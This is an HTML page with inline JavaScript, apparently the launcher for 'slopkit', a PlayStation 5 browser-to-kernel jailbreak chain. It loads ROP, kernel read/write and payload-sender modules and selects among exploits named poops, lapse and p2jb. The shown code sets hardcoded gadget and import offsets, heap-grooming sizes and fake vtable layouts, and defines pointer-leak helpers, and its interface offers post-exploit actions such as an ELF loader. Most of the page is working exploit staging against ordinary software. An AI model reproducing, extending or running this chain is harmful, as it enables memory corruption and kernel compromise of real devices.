<!doctype html>
<html lang="en" dir="ltr" data-renderer-state="loading">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>slopkit</title>
<!-- Reserved preload placeholder preserves parsed document shape. -->
<link rel="stylesheet" href="src/theme.css">
<style>
body {
    display: flex; flex-direction: column; align-items: center;
    min-height: 100vh; padding: 18px 12px;
}
#cap {
    margin-bottom: 14px; color: var(--text);
    font-size: 28px; font-weight: 800; letter-spacing: .5px;
    text-align: center;
}
#cat {
    display: block; width: 280px; max-width: 80vw;
    border: 1px solid var(--border); border-radius: 12px;
    box-shadow: 0 8px 24px rgba(0,0,0,.28);
}
#result {
    width: min(800px, 92vw); margin-top: 16px; padding: 20px;
    text-align: center;
}
#result-status { min-width: 0; }
#stage-banner {
    margin: 0; color: var(--text);
    font-size: 28px; line-height: 1.2; font-weight: 800;
    letter-spacing: .3px; overflow-wrap: anywhere;
}
#stage-banner.ok { color: var(--success-text); }
#stage-banner.bad { color: var(--danger-text); }
#stage-banner:empty { display: none; }
#status {
    margin: 6px 0 0; color: var(--muted);
    font-size: 18px; line-height: 1.4; font-weight: 600;
    text-align: center; overflow-wrap: anywhere;
}
#status:empty { display: none; }
#status.ok { color: var(--success-text); }
#status.bad { color: var(--danger-text); }
#post-actions {
    width: 100%; margin-top: 16px;
}
.post-action-list {
    display: flex; gap: 12px; align-items: stretch;
}
.post-action-item { flex: 1 1 0; min-width: 0; }
.post-action {
    width: 100%; padding: 12px 20px;
    font-size: 20px; line-height: 1.25; cursor: pointer;
    overflow-wrap: anywhere;
}
.post-action.failed { background: var(--danger-bg); border-color: var(--danger-border); color: var(--danger-text); }
.post-action[aria-disabled="true"] { cursor: default; }
.post-action.done {
    border-color: var(--success-border); background: var(--success-bg); color: var(--success-text);
}
.post-action.unavailable {
    border-color: var(--border); background: var(--raised); color: var(--muted);
}
#scr {
    margin: 0; padding: 0; white-space: pre-wrap; color: var(--muted);
    font-size: 16px; font-family: "Consolas", monospace;
    max-width: 100%; width: 100%; max-height: 320px;
    overflow-y: auto; overflow-x: hidden;
    overflow-wrap: anywhere;
    text-align: start; line-height: 1.4;
}
#scr .log-info { color: var(--muted); }
#scr .log-warn { color: var(--focus); }
#scr .log-ok   { color: var(--success-text); }
#scr .log-fail { color: var(--danger-text); }
#diagnostics {
    width: min(800px, 92vw); margin-top: 12px; padding: 14px;
    text-align: start;
}
#diagnostics-heading {
    margin: 0 0 8px; color: var(--text);
    font-size: 16px; line-height: 1.2; font-weight: 700;
}
@supports (display: grid) {
    .post-action-list {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    }
}
@media (max-height: 800px) {
    body { padding-top: 10px; }
    #cap { margin-bottom: 8px; }
    #cat { width: 200px; }
    #result { margin-top: 10px; padding: 16px; }
    #post-actions { margin-top: 12px; }
    #scr { max-height: 160px; }
}
@media (max-width: 700px) {
    .post-action-list { display: grid; grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div id="cap">slopkit</div>
<img id="cat" class="run" src="cat.jpg" alt="">
<section id="result" class="surface">
    <div id="result-status" role="status" aria-live="polite" aria-atomic="true">
        <h1 id="stage-banner"></h1>
        <p id="status" class="run"></p>
    </div>
    <section id="post-actions" aria-label="Post-exploit actions"
             data-i18n-aria-label="runtime.actions.heading"
             aria-hidden="true" style="opacity:0.001;pointer-events:none">
        <!--
            Keep a small fixed pool in the parsed document. PS5 WebKit can exhaust
            its post-exploit DOM/rendering budget when controls are created after
            the kernel and GPU stages have completed.
        -->
        <div id="post-action-list" class="post-action-list">
            <div class="post-action-item" data-post-action-slot>
                <a class="button primary post-action post-action-primary"
                   role="button" tabindex="-1" aria-disabled="true"
                   data-post-action-primary data-i18n="runtime.requested.run"
                   aria-describedby="status">Run requested action</a>
            </div>
            <div class="post-action-item" data-post-action-slot>
                <a class="button primary post-action post-action-primary"
                   role="button" tabindex="-1" aria-disabled="true"
                   data-post-action-primary data-i18n="runtime.autoloader.launch"
                   aria-describedby="status">Launch Unified Autoloader</a>
            </div>
            <div class="post-action-item" data-post-action-slot hidden>
                <a class="button primary post-action post-action-primary"
                   role="button" tabindex="-1" aria-disabled="true"
                   data-post-action-primary aria-describedby="status"></a>
            </div>
            <div class="post-action-item" data-post-action-slot hidden>
                <a class="button primary post-action post-action-primary"
                   role="button" tabindex="-1" aria-disabled="true"
                   data-post-action-primary aria-describedby="status"></a>
            </div>
        </div>
    </section>
</section>
<section id="diagnostics" class="surface" aria-labelledby="diagnostics-heading" hidden>
    <h2 id="diagnostics-heading" data-i18n="runtime.diagnostics.heading">Console</h2>
    <pre id="scr"></pre>
</section>
<script src="src/i18n.js"></script>
<script src="src/state.js"></script>
<script src="src/u64.js"></script>
<script src="src/memory.js"></script>
<script src="src/profile.js"></script>
<script src="src/native.js"></script>
<script src="src/rop.js"></script>
<script src="src/kernel.js"></script>
<script src="src/p2jb.js"></script>
<script src="src/ipv6-kernel-rw.js"></script>
<script src="src/lapse.js"></script>
<script src="src/post.js"></script>
<script src="src/pending-action.js"></script>
<script src="src/payload-sender.js"></script>
<script src="src/runtime.js"></script>
<script>
"use strict";

const Q = new URLSearchParams(location.search);
const I18n = Slopkit.I18n;
const localeReady = I18n.activate(Q.get("lang") || "auto",
    Array.isArray(navigator.languages) && navigator.languages.length
        ? navigator.languages : [navigator.language || "en"]);
I18n.apply(document);
const RUN_MODE = Q.get("mode") || "elf-loader";
const SELECTED_EXPLOIT = Q.get("exploit") || "poops";
const VALID_EXPLOITS = new Set(["poops", "lapse", "p2jb"]);
const OFFSETS_URL = "offsets/offsets.json";
const RENDERER_CONTRACT_QUERY = Q.get("rc") || "";
const resultNode = document.getElementById("result");
const postActionsNode = document.getElementById("post-actions");
const postActionList = document.getElementById("post-action-list");
const postActionSlots = Array.from(postActionList.querySelectorAll(
    "[data-post-action-slot]"), function (item) {
    return {
        item,
        control: item.querySelector("[data-post-action-primary]")
    };
});
const diagnosticsNode = document.getElementById("diagnostics");
let payloadActionBusy = false;
let postActionModel = [];
let postActionNotice = null;
let postActionSurfacePrimed = false;
let postActionRevealTimer = null;
let postActionSurfaceVisible = false;

function t(key, values) {
    return I18n.t(key, values);
}

// This parse-only split value keeps an unarmed page evaluable when its query
// is absent. Every armed path rejects the missing query before startAttempt().
const PARSE_ONLY_RENDERER_CONTRACT = Slopkit.Profile.decodeRendererContract(
    "[1,1,48,8,16,24,8,32,8,40,1,88,562949953421312,131072,16976,0,1,64,8,16,6,24,0,48,40,8,32,8,16,24,48,26,14,56,8,0,40,48,32,26,12,56,23,16,24,32,40,48,49,50,51,52,53,1,0,1,2]");
let RENDERER_CONTRACT = null;
let RENDERER_CONTRACT_ERROR = "";
try {
    RENDERER_CONTRACT = Slopkit.Profile.decodeRendererContract(
        RENDERER_CONTRACT_QUERY);
} catch (error) {
    RENDERER_CONTRACT_ERROR = `${error?.name}:`
        + String(error?.message).slice(0, 96);
}
const RENDERER_LAYOUT = RENDERER_CONTRACT?.rendererLayout
    || PARSE_ONLY_RENDERER_CONTRACT.rendererLayout;
const RENDERER_ENCODING = RENDERER_CONTRACT?.rendererEncoding
    || PARSE_ONLY_RENDERER_CONTRACT.rendererEncoding;
const RENDERER_BOOTSTRAP = RENDERER_CONTRACT?.rendererBootstrap
    || PARSE_ONLY_RENDERER_CONTRACT.rendererBootstrap;
const RENDERER_OBJECTS = RENDERER_CONTRACT?.rendererObjects
    || PARSE_ONLY_RENDERER_CONTRACT.rendererObjects;

function intParam(name, fallback, lo, hi) {
    const raw = parseInt(Q.get(name) ?? "", 10);
    return Number.isFinite(raw) ? Math.max(lo, Math.min(hi, raw)) : fallback;
}

function hexParam(name, fallback) {
    const v = Q.get(name);
    if (!v) return fallback;
    const raw = parseInt(v, 16);
    return Number.isFinite(raw) && raw > 0 ? raw : fallback;
}

function hexListParam(name, fallback) {
    const v = Q.get(name);
    if (!v) return fallback;
    const out = [];
    for (const part of v.split(",")) {
        const raw = parseInt(part, 16);
        if (Number.isFinite(raw) && raw > 0) out.push(raw);
    }
    return out.length ? out : fallback;
}

const P_HOST_CTOR_LIST = hexListParam("hc", [0x1e0d8, 0x1e320, 0x1f368]);
const P_NOTIFY = hexParam("notify", 0x4740);
const P_GADGET = hexParam("gd", 0x1d11a);
const P_GETPID_SLOT = hexParam("gps", 0x34f57b8);
const P_GETPID_EXP = hexParam("gpe", 0x1b280);
const P_CLOSE_SLOT = hexParam("cls", 0x34f57a8);
const P_CLOSE_EXP = hexParam("cle", 0x26e70);
const P_ERROR_SLOT = hexParam("ers", 0x34f57b0);
const P_ERROR_EXP = hexParam("ere", 0xf340);
const P_ATTESTATION_KIND = Q.get("att") || "";
const SLOPKIT_ATTESTATION_KIND = "slopkit-live-v2";
const REFERENCE_ATTESTATION =
    P_ATTESTATION_KIND === SLOPKIT_ATTESTATION_KIND;
const P_KERNEL_IMPORT_SLOT = hexParam("kis", 0);
const P_KERNEL_IMPORT_EXPORT = hexParam("kie", 0);
const P_LIBC_IMPORT_SLOT = hexParam("lis", 0);
const P_LIBC_IMPORT_EXPORT = hexParam("lie", 0);

const DRAIN_COUNT = intParam("n", 512, 64, 1024);
const SCREEN_LINES = intParam("lines", 64, 0, 400);
const PLACEMENT_PAIRS = 4;

const REVISION = "slopkit-full-chain-v1";
const RUNTIME_REVISION_FALLBACK = "runtime-staged-loader-recovery-v3";
const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = RENDERER_LAYOUT.snapshotBytes;
const FUNCTION_BYTES = RENDERER_OBJECTS.jsFunction.snapshotBytes;
const NATIVE_EXECUTABLE_BYTES =
    RENDERER_OBJECTS.nativeExecutable.snapshotBytes;
const HOLDER_BYTES = RENDERER_OBJECTS.plainObject.snapshotBytes;
const ARENA_VIEW_BYTES = RENDERER_OBJECTS.uint8Array.snapshotBytes;
const COLLATOR_BYTES = RENDERER_OBJECTS.intlCollator.snapshotBytes;
const COLLATOR_STABLE_READ_ROUNDS = 3;
const BOUND_COMPARE_BYTES = RENDERER_OBJECTS.boundFunction.snapshotBytes;
const WEBKIT_TEXT_SIZE = hexParam("wts", 0x2c7c000);
const WEBKIT_CODE_LIMIT = REFERENCE_ATTESTATION
    ? hexParam("wcl", 0) : WEBKIT_TEXT_SIZE;
const NATIVE_TEXT_SIZE_QUERY = Q.get("nts") || "";
const NATIVE_TEXT_SIZE = hexParam("nts", 0);
const NATIVE_TEXT_SIZE_QUERY_VALID = /^0x[0-9a-f]+$/i.test(
    NATIVE_TEXT_SIZE_QUERY) && NATIVE_TEXT_SIZE > 0;

const NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
const NOTIFY_OFFSET = P_NOTIFY;
const ARENA_BYTES = 0x1000;
const FAKE_UCOLLATOR_OFFSET = 0x100;
const FAKE_VTABLE_OFFSET = 0x300;

const CARRIER_SLOTS = 9000000;
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = intParam("cap", 50, 0, 60000);
const COMPOSE_DELAY_MS = CAPTURE_DELAY_MS + intParam("gap", 50, 0, 60000);
const symbolToString = Symbol.prototype.toString;

const DRAIN_SIZE = 0x10000;
const SLAB_SIZE = 0x400000;
const BUTTERFLY_HOLE_SIZE = 0x81000;
const SEPARATOR_SIZE = 0x10000;
const EARLY_HOLE_SIZE = 0x70000;
const GUARD_SIZE = 0x90000;
const PREDECESSOR_SIZE = 0x80000;
const FINAL_HOLE_SIZE = 0x80000;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const arenaViewHeader = new Uint8Array(ARENA_VIEW_BYTES);
const collatorHeader = new Uint8Array(COLLATOR_BYTES);
// Reuse the retired holder header to avoid a pre-groom allocation.
const collatorHeaderRepeat = holderHeader;
const compareFnHeader = new Uint8Array(BOUND_COMPARE_BYTES);
const collatorOriginal = new Uint8Array(COLLATOR_BYTES
    - RENDERER_OBJECTS.intlCollator.collatorOffset);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const navigationID = Date.now().toString(36);
const singleAttemptPolicy = Q.get("auto") === "0" && Q.get("max") === "1";
const armed = Q.get("go") === "1";
const PREVIEW_MODE = Q.get("preview") || "";
const COMPLETE_PREVIEW = !armed && PREVIEW_MODE === "complete";
const POST_ACTION_PREVIEW = !armed
    && (PREVIEW_MODE === "actions" || COMPLETE_PREVIEW);
const POST_ACTION_REVEAL_DELAY_MS = 750;
const runToken = Q.get("run") || "";
const validRunToken = /^[0-9a-f]{32}$/i.test(runToken);
const runKey = validRunToken ? `${REVISION}:run:${runToken}` : "";
const blockKey = `${REVISION}:blocked`;

let alreadyBlocked = false;
try {
    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
} catch {}

let seq = 0;
const screenLines = [];

let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let persistentCarrier = null;
let preloadedProfile = null;
let runtimeStarted = false;
let rendererAttemptStarted = false;
let runtimeExtensionLoading = false;
let runtimeExtensionCarrierPassed = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
let nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let arenaBuffer = null;
let arenaView = null;
let realCollator = null;
let compareFn = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let hostAddress = NaN;
let fakeAddress = NaN;

let predecessorWords = null;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let arenaViewAddress = NaN;
let realCollatorAddress = NaN;
let compareFnAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let webkitBase = NaN;
let webkitBaseOK = false;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let gotReadOK = false;

let kernelBase = NaN;
let kernelBaseOK = false;
let libcBase = NaN;
let libcBaseOK = false;

let holderHeaderOK = false;
let arenaViewHeaderOK = false;
let collatorHeaderOK = false;
let compareFnHeaderOK = false;
let arenaBacking = NaN;
let arenaBackingRepeated = false;
let fakeUCollatorAddress = NaN;
let fakeVtableAddress = NaN;
let naturalTrampolineAddress = NaN;
let notifyEntryAddress = NaN;
let notifyAddressOK = false;
let arenaLayoutOK = false;
let arenaFilledOK = false;
let carrierReady = false;
let handoffReady = false;
let attemptBlocked = false;

let compositionState = 0;
let compositionLength = 0;

const FW_LABEL = (function () {
    const p = Q.get("fw");
    if (p) return p;
    const m = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
    return m ? m[1] : "??.??";
})();

// The launcher's arm record is the durable attempt identity. Read it
// without mutating storage so early renderer failures use the same tuple as
// attempt_started, before the profile fetch has completed.
let ARM_CONTEXT_ERROR = "";
const ARM_CONTEXT = (function () {
    try {
        const id = Q.get("arm") || "";
        if (!/^[0-9a-f]{32}$/i.test(id)) {
            ARM_CONTEXT_ERROR = "renderer arm token is invalid";
            return {};
        }
        const value = JSON.parse(sessionStorage.getItem(
            `slopkit:arm:${id}`) || "null");
        if (!value || value.firmware !== FW_LABEL
            || value.mode !== "full-chain"
            || value.exploit !== SELECTED_EXPLOIT) {
            ARM_CONTEXT_ERROR =
                "renderer arm token is bound to another exploit profile";
            return {};
        }
        return value;
    } catch {
        ARM_CONTEXT_ERROR = "renderer arm token could not be read";
        return {};
    }
})();

function verifyArmContextProfile(profile) {
    if (ARM_CONTEXT_ERROR) throw new Error(ARM_CONTEXT_ERROR);
    if (RUN_MODE !== "elf-loader" || profile?.mode !== "elf-loader"
        || profile.firmware !== FW_LABEL
        || profile.exploit !== SELECTED_EXPLOIT)
        throw new Error("renderer profile does not match the armed launch");
    const qualification = profile.qualificationRecord?.();
    if (!qualification
        || ARM_CONTEXT.profileRevision !== qualification.profileRevision
        || ARM_CONTEXT.engineRevision !== qualification.engineRevision
        || ARM_CONTEXT.runtimeRevision !== qualification.runtimeRevision)
        throw new Error("renderer arm token has stale profile revisions");
    return true;
}

function setCaption(text) {
    try { document.getElementById("cap").textContent = text; } catch {}
}

const IMG_IDLE    = "cat.jpg";

function catState(cls) {
    try {
        var el = document.getElementById("cat");
        el.className = cls;
        el.src = IMG_IDLE;
    } catch {}
}

function setStageBanner(text, cls) {
    try {
        var el = document.getElementById("stage-banner");
        el.textContent = text;
        el.className = cls || "";
        resultNode.className = "surface"
            + (String(cls || "").split(/\s+/).includes("bad") ? " tone-bad"
                : String(cls || "").split(/\s+/).includes("ok")
                    ? " tone-ok" : "");
    } catch {}
}

const logStartTime = Date.now();

function screenLine(text, severity, unabridged) {
    var elapsed = ((Date.now() - logStartTime) / 1000).toFixed(1);
    var ts = "[" + elapsed + "s] ";
    var cls = "log-" + (severity || "info");
    var display = !unabridged && text.length > 110
        ? text.slice(0, 107) + "..." : text;
    screenLines.push({ text: ts + display, cls: cls });
    if (screenLines.length > SCREEN_LINES)
        screenLines.splice(0, screenLines.length - SCREEN_LINES);
    try {
        var scrEl = document.getElementById("scr");
        if (SCREEN_LINES === 0) return;
        var wasEmpty = scrEl.childNodes.length === 0;
        var wasAtBottom = wasEmpty
            || scrEl.scrollHeight - scrEl.scrollTop - scrEl.clientHeight <= 4;
        if (!wasEmpty) scrEl.appendChild(document.createTextNode("\n"));
        var row = document.createElement("span");
        row.className = cls;
        row.textContent = ts + display;
        scrEl.appendChild(row);
        while (scrEl.children.length > SCREEN_LINES) {
            scrEl.removeChild(scrEl.firstChild);
            if (scrEl.firstChild && scrEl.firstChild.nodeType === 3)
                scrEl.removeChild(scrEl.firstChild);
        }
        // Preserve an operator's scrollback position. Follow new output only
        // while the log was already at the bottom.
        if (wasAtBottom) scrEl.scrollTop = scrEl.scrollHeight;
    } catch {}
}

const DIAGNOSTICS_ON = Q.get("diag") === "1";
const QUIET_LAPSE_UI = SELECTED_EXPLOIT === "lapse";
let diagnosticsQuiet = false;
const deferredDiagnostics = [];
diagnosticsNode.hidden = !DIAGNOSTICS_ON;

function setDiagnosticsQuiet(value) {
    diagnosticsQuiet = value === true;
    if (diagnosticsQuiet || !DIAGNOSTICS_ON) return;
    while (deferredDiagnostics.length) {
        const item = deferredDiagnostics.shift();
        note(item.tag, item.extra, item.severity);
    }
}
function mark(tag, extra) {
    seq++;
    var severity = "info";
    if (/^(HARD-STOP|FAILED|POWER-OFF-REQUIRED)/.test(tag)
            || /-FAILED$/.test(tag))
        severity = "fail";
    else if (/^(REPORT-COMPOSITION|RUNTIME-LAUNCH|ARMED-INIT|RUNTIME-EXTENSION-LOAD-DONE|ELFLDR-READY|RUNTIME-COMPLETE|PAYLOAD-SENT|REQUESTED-ACTION-SENT)/.test(tag)) severity = "ok";
    else if (/^(EARLY-SAFE-FINISH|REBOOT-REQUIRED)/.test(tag)) severity = "warn";
    const terminal = /^(HARD-STOP|FAILED|POWER-OFF-REQUIRED|REBOOT-REQUIRED|LAPSE-(?:SEALED|QUARANTINED))/.test(tag);
    const lapseCritical = /^(LAPSE-|KERNEL-RW-RETURNED|ROOT-|GPU-|ELFLDR-|PAYLOAD-|BROWSER-)/
        .test(tag);
    // Quiet Lapse runs avoid rebuilding the scrollback DOM while the kernel
    // primitive is active. showStatus/setStageBanner still update one text
    // node so the operator can see coarse progress.
    if (!DIAGNOSTICS_ON) return;
    if (!terminal && (diagnosticsQuiet
            || (QUIET_LAPSE_UI && lapseCritical))) {
        deferredDiagnostics.push({ tag, extra, severity });
        if (deferredDiagnostics.length > SCREEN_LINES)
            deferredDiagnostics.shift();
        return;
    }
    note(tag, extra, severity);
}

function note(tag, extra, severity) {
    const unabridged = /^(HARD-STOP|POWER-OFF-REQUIRED|REBOOT-REQUIRED)$/.test(tag);
    screenLine(`${tag}` + (extra !== undefined ? ` ${extra}` : ""),
        severity, unabridged);
}

function showStatus(text, cls) {
    try {
        const node = document.getElementById("status");
        node.textContent = text;
        node.className = cls || "";
    } catch {}
}

function showPostActionNotice(notice) {
    if (!notice?.headlineKey) return;
    const cls = notice.cls || "";
    setStageBanner(t(notice.headlineKey, notice.headlineValues), cls);
    showStatus(notice.detailKey
        ? t(notice.detailKey, notice.detailValues) : "", cls);
}

function setNodeText(node, value) {
    if (node.textContent !== value) node.textContent = value;
}

function activatePostAction(event) {
    if (event.currentTarget.getAttribute("aria-disabled") === "true") return;
    const actionId = event.currentTarget.dataset.actionId;
    let action = null;
    for (const candidate of postActionModel) {
        if (candidate.id === actionId) {
            action = candidate;
            break;
        }
    }
    if (!action) return;
    runPostAction(action);
}

function setPostActionEnabled(control, enabled) {
    const ariaDisabled = enabled ? "false" : "true";
    const tabIndex = enabled ? 0 : -1;
    if (control.getAttribute("aria-disabled") !== ariaDisabled)
        control.setAttribute("aria-disabled", ariaDisabled);
    if (control.tabIndex !== tabIndex) control.tabIndex = tabIndex;
}

function stagePostActionSurface() {
    postActionSurfaceVisible = false;
    postActionsNode.style.opacity = "0.001";
    postActionsNode.style.pointerEvents = "none";
    postActionsNode.setAttribute("aria-hidden", "true");
}

function revealPostActionSurface(interactive) {
    postActionSurfaceVisible = true;
    postActionsNode.hidden = false;
    postActionsNode.style.opacity = "1";
    postActionsNode.style.pointerEvents = interactive ? "auto" : "none";
    postActionsNode.removeAttribute("aria-hidden");
}

function primePostExploitActions() {
    if (postActionSurfacePrimed) return;
    const registered = typeof Slopkit.PostActions?.all === "function"
        ? Slopkit.PostActions.all().slice().sort((left, right) =>
            left.order - right.order) : [];
    const descriptors = armed ? registered.filter((action) =>
        Slopkit.PostActions.supportsFirmware(action.id, FW_LABEL)) : registered;
    if (descriptors.length > postActionSlots.length)
        throw new Error("post-action control pool is too small");
    for (let index = 0; index < postActionSlots.length; ++index) {
        const slot = postActionSlots[index];
        const descriptor = descriptors[index];
        slot.control.addEventListener("click", activatePostAction);
        setPostActionEnabled(slot.control, false);
        const shouldHide = !descriptor;
        if (slot.item.hidden !== shouldHide) slot.item.hidden = shouldHide;
        if (!descriptor) {
            slot.control.removeAttribute("data-action-id");
            continue;
        }
        const actionName = t(descriptor.titleKey);
        if (slot.control.dataset.actionId !== descriptor.id)
            slot.control.dataset.actionId = descriptor.id;
        setNodeText(slot.control, t(descriptor.readyKey
            || "runtime.payload.launchAction", { action: actionName }));
    }
    // Keep the parsed controls in a nearly transparent paint layer during an
    // armed run. Old PS5 WebKit can hit-test controls created or first painted
    // after exploitation while failing to raster their backgrounds and text.
    // Do not force layout or yield here: exploit preload must retain its
    // original timing.
    if (descriptors.length === 0 || (!armed && !POST_ACTION_PREVIEW)) {
        stagePostActionSurface();
        postActionsNode.hidden = true;
    } else if (POST_ACTION_PREVIEW) {
        revealPostActionSurface(false);
    } else {
        postActionsNode.hidden = false;
        stagePostActionSurface();
    }
    postActionSurfacePrimed = true;
}

function cancelPostActionReveal() {
    if (postActionRevealTimer === null) return;
    clearTimeout(postActionRevealTimer);
    postActionRevealTimer = null;
}

function schedulePostActionReveal() {
    if (POST_ACTION_PREVIEW || postActionRevealTimer !== null
            || postActionSurfaceVisible || postActionModel.length === 0)
        return;
    postActionRevealTimer = setTimeout(function () {
        postActionRevealTimer = null;
        if (postActionModel.length > 0) revealPostActionSurface(true);
    }, POST_ACTION_REVEAL_DELAY_MS);
}

function showPostExploitActions(model) {
    postActionModel = Array.isArray(model?.actions)
        ? model.actions.slice().sort((left, right) => left.order - right.order)
        : [];
    if (postActionModel.length > postActionSlots.length)
        postActionModel = postActionModel.slice(0, postActionSlots.length);
    postActionNotice = model?.notice || null;
    showPostActionNotice(postActionNotice);
    const serializedBusy = payloadActionBusy || postActionModel.some(
        (action) => action.state === "sending");
    for (let index = 0; index < postActionSlots.length; ++index) {
        const slot = postActionSlots[index];
        const action = postActionModel[index];
        const control = slot.control;
        if (!action) {
            if (!slot.item.hidden) slot.item.hidden = true;
            setPostActionEnabled(control, false);
            if (control.hasAttribute("aria-busy"))
                control.removeAttribute("aria-busy");
            continue;
        }
        if (slot.item.hidden) slot.item.hidden = false;
        if (control.className !== "button primary post-action post-action-primary")
            control.className = "button primary post-action post-action-primary";
        if (control.dataset.actionId !== action.id)
            control.dataset.actionId = action.id;
        if (control.hasAttribute("aria-busy"))
            control.removeAttribute("aria-busy");
        const actionName = action.label || t(action.titleKey);
        if (action.state === "sending") {
            setNodeText(control, t(action.sendingKey
                || "runtime.payload.launching"));
            setPostActionEnabled(control, false);
            control.setAttribute("aria-busy", "true");
        } else if (action.state === "sent") {
            setNodeText(control,
                t(action.sentKey || "runtime.payload.sent", {
                    action: actionName
                }));
            setPostActionEnabled(control, false);
            control.classList.add("done");
        } else if (action.state === "unavailable") {
            setNodeText(control, t(action.unavailableKey
                || "runtime.payload.unavailable"));
            setPostActionEnabled(control, false);
            control.classList.add("unavailable");
        } else {
            setNodeText(control, action.state === "failed"
                ? t(action.retryKey || "runtime.payload.retry")
                : t(action.readyKey || "runtime.payload.launchAction", {
                    action: actionName
                }));
            setPostActionEnabled(control, !serializedBusy
                && typeof action.launch === "function");
            if (action.state === "failed") control.classList.add("failed");
        }
    }
    if (postActionModel.length === 0) {
        cancelPostActionReveal();
        stagePostActionSurface();
        postActionsNode.hidden = true;
    } else if (POST_ACTION_PREVIEW) {
        revealPostActionSurface(false);
    } else {
        schedulePostActionReveal();
    }
}

async function runPostAction(action) {
    if (typeof action?.launch !== "function" || payloadActionBusy) return;
    payloadActionBusy = true;
    for (const slot of postActionSlots)
        setPostActionEnabled(slot.control, false);
    postActionNotice = null;
    setStageBanner(t(action.stageKey
        || "runtime.stage.startingAutoloader"), "");
    showStatus("", "run");
    try {
        await action.launch();
    } catch (error) {
        mark(action.progressPrefix === "REQUESTED-ACTION"
            ? "REQUESTED-ACTION-FAILED" : "FAILED-PAYLOAD-ACTION", action.id);
    } finally {
        payloadActionBusy = false;
        showPostExploitActions({
            actions: postActionModel,
            notice: postActionNotice
        });
    }
}

function hardStop(reason, recoveryDisposition) {
    const disposition = recoveryDisposition === "dirty-cold-power-cycle"
        ? recoveryDisposition : "safe-normal-reboot";
    const recoveryKey = disposition === "dirty-cold-power-cycle"
        ? "runtime.status.coldPower" : "runtime.status.reboot";
    const recoveryText = t(recoveryKey);
    mark("HARD-STOP", reason || "validation-failed");
    mark(disposition === "dirty-cold-power-cycle"
        ? "POWER-OFF-REQUIRED" : "REBOOT-REQUIRED", recoveryText);
    try {
        Slopkit.Attempts?.finish(Q.get("arm"), {
            outcome: "failure",
            terminalStage: runtimeStarted ? "runtime" : "renderer",
            rebootRequired: true,
            recoveryDisposition: disposition,
            stages: rendererAttemptStarted ? ["renderer"] : []
        });
    } catch {}
    stopped = true;
    retryScheduled = false;
    if (armed) {
        try { sessionStorage.setItem(blockKey, "1"); } catch {}
    }
    catState("bad");
    cancelPostActionReveal();
    stagePostActionSurface();
    postActionsNode.hidden = true;
    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
    setStageBanner(t(disposition === "dirty-cold-power-cycle"
        ? "runtime.stage.powerOff" : "runtime.stage.stopped"), "bad");
    showStatus(recoveryText, "bad");
}

function failed(reason) {
    const candidateStateSafe = !candidateEverReturned
        || (zeroHeaderMiss && !candidateMutationStarted);
    if (retrySafe && candidateStateSafe && !candidateMutationStarted
        && !carrierReady && !runtimeStarted)
        releaseSafeAttemptMemory();
    hardStop(reason || "single attempt failed");
}

function buffer(size) {
    return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) {
        if (bytes[i] !== 0)
            return false;
    }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000;
}

function smallUnsignedAt(bytes, offset, width) {
    if (width !== 1 && width !== 4 && width !== 8)
        return NaN;
    let value = bytes[offset];
    if (width >= 4) {
        value += bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000;
    }
    if (width === 8 && !allZero(bytes, offset + 4, offset + 8))
        return NaN;
    return value;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function putLow48(bytes, offset, value) {
    if (!plausibleAddress(value))
        throw new Error("putLow48-invalid-value");
    const high = Math.floor(value / 0x100000000);
    const low = value - high * 0x100000000;
    bytes[offset] = low & 0xff;
    bytes[offset + 1] = Math.floor(low / 0x100) & 0xff;
    bytes[offset + 2] = Math.floor(low / 0x10000) & 0xff;
    bytes[offset + 3] = Math.floor(low / 0x1000000) & 0xff;
    bytes[offset + 4] = high & 0xff;
    bytes[offset + 5] = Math.floor(high / 0x100) & 0xff;
    bytes[offset + 6] = 0;
    bytes[offset + 7] = 0;
}

function low48StoredExactly(bytes, offset, value) {
    return low48At(bytes, offset) === value
        && bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

